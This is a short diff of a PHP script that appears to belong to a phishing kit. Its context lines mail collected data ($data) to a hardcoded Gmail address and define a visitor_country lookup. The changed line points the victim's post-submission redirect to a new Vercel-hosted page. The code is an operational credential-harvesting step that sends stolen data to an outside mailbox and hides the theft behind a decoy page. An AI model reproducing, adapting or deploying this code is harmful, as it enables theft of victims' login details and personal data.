@@ -25,7 +25,7 @@ $emailusr = 'sonofmercysonofmercy@gmail.com,sonofmercysonofmercy@gmail.com';
 
  {
 mail($emailusr, $mailsubj, $data);
-header("Location: https://rev-ten.vercel.app/DlCtyHal.html");
+header("Location: https://druid-topaz.vercel.app/V1.html");
 }
 
 function visitor_country()
